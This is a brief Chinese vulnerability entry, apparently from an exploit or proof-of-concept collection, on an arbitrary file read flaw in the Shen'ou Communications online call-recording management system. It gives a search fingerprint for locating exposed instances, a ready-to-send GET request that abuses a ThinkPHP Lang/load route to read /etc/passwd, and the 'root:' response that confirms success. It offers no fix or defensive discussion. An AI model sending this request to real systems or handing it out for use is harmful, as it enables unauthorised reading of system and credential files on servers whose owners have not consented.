# 申瓯通信在线录音管理系统index存在任意文件读取漏洞

申瓯通信在线录音管理系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="在线录音管理系统"`
- **请求**：`GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/etc/passwd HTTP/1.1`
- **响应特征**：200 root: